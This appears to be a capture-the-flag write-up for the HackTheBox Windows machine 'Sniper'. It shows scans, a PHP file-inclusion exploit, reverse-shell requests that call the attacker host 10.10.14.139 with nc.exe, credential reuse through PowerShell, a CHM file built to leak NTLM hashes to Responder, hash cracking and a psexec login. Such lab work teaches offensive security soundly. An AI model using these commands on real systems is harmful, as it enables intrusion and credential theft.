---
layout: post
title: Sniper - Medium - Windows
date: 05-10-2019
categories: [CTF - HackTheBox]
tag: [File Disclosure, chm, NTLM, Responder, HTML Help Workshop, PHP, SMB]
---

# Nmap scan
Scan reveals a Windows machine running IIS in addition to SMB.

```
# Nmap 7.93 scan initiated Tue Aug  1 01:53:27 2023 as: nmap -sC -sV -p- -oA nmap/sniper-allports -v 10.129.229.6
Nmap scan report for 10.129.229.6
Host is up (0.035s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-08-01T07:56:37
|_  start_date: N/A
|_clock-skew: 7h00m00s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug  1 01:57:12 2023 -- 1 IP address (1 host up) scanned in 224.87 seconds

```

# Gobuster - port 80
Two interesting directories were discovered on the web service, `user` and `blog`.

```
┌─[parrot@parrot]─[~/hackthebox/sniper]
└──╼ $gobuster dir -u http://10.129.229.6/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.229.6/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/08/01 02:00:47 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 150] [--> http://10.129.229.6/images/]
/js                   (Status: 301) [Size: 146] [--> http://10.129.229.6/js/]    
/css                  (Status: 301) [Size: 147] [--> http://10.129.229.6/css/]   
/user                 (Status: 301) [Size: 148] [--> http://10.129.229.6/user/]  
/blog                 (Status: 301) [Size: 148] [--> http://10.129.229.6/blog/]
```

# Gobuster - web user directory
```
┌─[parrot@parrot]─[~/hackthebox/sniper]
└──╼ $gobuster dir -u http://10.129.229.6/user/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.229.6/user/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/08/01 02:05:24 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 155] [--> http://10.129.229.6/user/images/]
/js                   (Status: 301) [Size: 151] [--> http://10.129.229.6/user/js/]    
/css                  (Status: 301) [Size: 152] [--> http://10.129.229.6/user/css/]   
/logout.php           (Status: 302) [Size: 3] [--> login.php]                         
/login.php            (Status: 200) [Size: 5456]                                      
/db.php               (Status: 200) [Size: 0]                                         
/index.php            (Status: 302) [Size: 0] [--> login.php]                         
/auth.php             (Status: 302) [Size: 0] [--> login.php]                         
/fonts                (Status: 301) [Size: 154] [--> http://10.129.229.6/user/fonts/] 
/registration.php     (Status: 200) [Size: 5922]                                      
/vendor               (Status: 301) [Size: 155] [--> http://10.129.229.6/user/vendor/]

```

# Gobuster - web blog directory

```
┌─[parrot@parrot]─[~/hackthebox/sniper]
└──╼ $gobuster dir -u http://10.129.229.6/blog/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.229.6/blog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/08/01 02:07:43 Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 151] [--> http://10.129.229.6/blog/js/]
/css                  (Status: 301) [Size: 152] [--> http://10.129.229.6/blog/css/]
/index.php            (Status: 200) [Size: 5704]                                   
/blog-en.php          (Status: 200) [Size: 4341] 
```

# Inspecting blog directory - LFI discovery
A typical PHP LFI was discovered when passing a file to the language parameter. The example below shows it reading the hosts file on the Windows server.

### Request - LFI
```
GET /blog/?lang=/windows/system32/drivers/etc/hosts HTTP/1.1
Host: 10.129.229.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=sag331fan90t32cm1a7v1dc5cj
Upgrade-Insecure-Requests: 1
```

### Response - LFI
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.1
Date: Tue, 01 Aug 2023 08:10:07 GMT
Connection: close
Content-Length: 2187

<html>
*SNIPPED*
</head>

<body>
*SNIPPED*
</body>

</html>
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host
# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
</body>
</html>	
```

# RCE with RFI
It was possible to load remote resources with the same `lang` parameter as shown below. If the PHP function is using includes it may be possible to get code execution. I setup an SMB server on my end and hosted PHP file which will run system commands passed as a parameter as shown below.

### Request - RCE
```
GET /blog/?lang=\\10.10.14.139\ctf\cmd.php&cmd=whoami HTTP/1.1
Host: 10.129.229.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=sag331fan90t32cm1a7v1dc5cj
Upgrade-Insecure-Requests: 1
```

### Response - RCE

The system returned the output of the `whois` command within the response proving its possible to get code execution.
```
</html>
nt authority\iusr

</body>
</html>
```

# Reverse Shell - RCE

Request was changed to a POST request and modified to suit the requirements. This time a reverse shell payload was passed as a parameter for code execution.

### Request - Reverse Shell
```
POST /blog/index.php?lang=\\10.10.14.139\ctf\cmd.php  HTTP/1.1
Host: 10.129.229.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=sag331fan90t32cm1a7v1dc5cj
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

cmd=\\10.10.14.139\ctf\nc.exe+10.10.14.139+9001+-e+powershell
```

### Response - Reverse Shell
```
┌─[parrot@parrot]─[/srv/smb]
└──╼ $nc -lvnp 9001
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.229.6.
Ncat: Connection from 10.129.229.6:49693.
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\blog> 
```

# Dumping config files
Exploring the file system uncovered a file with database credentials.

```
PS C:\inetpub\wwwroot\user> type db.php
type db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
PS C:\inetpub\wwwroot\user> 
```

# Logging in as Chris
The credentials were valid for a user on the system called Chris. It was possible to invoke commands as Chris using PowerShell.

### Storing password in a secure string object.
```
$password = ConvertTo-SecureString "36mEAhz/B8xQ~2VM" -AsPlainText -Force
```

### Creating a new credential object
```
$creds = New-Object System.Management.Automation.PSCredential("SNIPER\Chris", $password)
```

### Invoking a command - whois test
```
Invoke-Command -ComputerName Sniper -Credential $creds -ScriptBlock {whoami}
sniper\chris
PS C:\inetpub\wwwroot\blog>
```

### Invoking a command - reverse shell 
```
Invoke-Command -ComputerName Sniper -Credential $creds -ScriptBlock {\\10.10.14.139\ctf\nc.exe 10.10.14.139 9003 -e powershell}
```

# Reverse Shell - Chris
After invoking the command as Chris it was possible to gain a reverse shell as that user.

```
┌─[✗]─[parrot@parrot]─[~/hackthebox/sniper]
└──╼ $rlwrap nc -lvnp 9003
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9003
Ncat: Listening on 0.0.0.0:9003
Ncat: Connection from 10.129.229.6.
Ncat: Connection from 10.129.229.6:49717.
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

whoami
whoami
sniper\chris
PS C:\Users\Chris\Documents>
```

# Docs directory - CHM files
There was a file on the system hinting that the `Docs` directory on the drive is being monitored for new instructions. Next step will be to craft a malicious CHM file and upload it. HTML Help Workshop was used to create and compile the file.

### HTML file added to CHM project
```
<html>
<body>
<img src=\\10.10.14.139\ctf\img.png />
</body>
</html>
```

### Compiling the CHM
```
Microsoft HTML Help Compiler 4.74.8702

Compiling c:\Users\commando\Desktop\sniper.chm


Compile time: 0 minutes, 26 seconds
1	Topic
0	Local links
0	Internet links
0	Graphics


Created c:\Users\commando\Desktop\sniper.chm, 10,280 bytes
Compression increased file by 10,208 bytes.
```

### Writing the CHM file to Docs
```
    Directory: C:\Docs


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/11/2019   9:31 AM            285 note.txt                                                              
-a----        4/11/2019   9:17 AM         552607 php for dummies-trial.pdf                                             


wget 10.10.14.139:8000/sniper.chm -O sniper.chm
wget 10.10.14.139:8000/sniper.chm -O sniper.chm
ls
ls


    Directory: C:\Docs


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/11/2019   9:31 AM            285 note.txt                                                              
-a----        4/11/2019   9:17 AM         552607 php for dummies-trial.pdf                                             
-a----         8/1/2023   5:41 AM          10280 sniper.chm                                                            


PS C:\Docs>
```

# Responder - NTLMv2 hash returned

After writing the malicious CHM file to the Docs directory responder got a hit. When the CHM file was opened it automatically attempted to load the image within the HTML. That image was pointed towards the SMB service on my machine. Responder was able to catch the hash which belongs to the administrator. 

### NTLMv2 hash captured
```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.229.6
[SMB] NTLMv2-SSP Username : SNIPER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::SNIPER:f4807538bb1232d6:D16DBDA045E432A88753DD0A49D5A435:010100000000000000BC0C5943C4D901038134D132889FCA0000000002000800570051003500550001001E00570049004E002D004D00430032005600560055005800570059003900330004003400570049004E002D004D0043003200560056005500580057005900390033002E0057005100350055002E004C004F00430041004C000300140057005100350055002E004C004F00430041004C000500140057005100350055002E004C004F00430041004C000700080000BC0C5943C4D9010600040002000000080030003000000000000000000000000030000087903AC9D5D3B090468899CF3DE28FFDD734EB1C81D3FB35F47CD6EE9B9CCB4F0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310033003900000000000000000000000000
```

# Cracking the Hash
John was able to crack the hash using the `rockyou` wordlist.
```
┌─[parrot@parrot]─[~/hackthebox/sniper]
└──╼ $john admin_ntlm --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
b******1     (Administrator)
1g 0:00:00:00 DONE (2023-08-01 06:54) 1.449g/s 2831Kp/s 2831Kc/s 2831KC/s byrd81..burlfish8
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

# psexec.py login - administrator
It was possible to use psexec.py to login to the machine as admin and capture the root password.

```
┌─[✗]─[parrot@parrot]─[~/hackthebox/sniper]
└──╼ $psexec.py administrator@10.129.229.6
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

Password:
[*] Requesting shares on 10.129.229.6.....
[*] Found writable share ADMIN$
[*] Uploading file cRyrvaag.exe
[*] Opening SVCManager on 10.129.229.6.....
[*] Creating service RlYt on 10.129.229.6.....
[*] Starting service RlYt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```
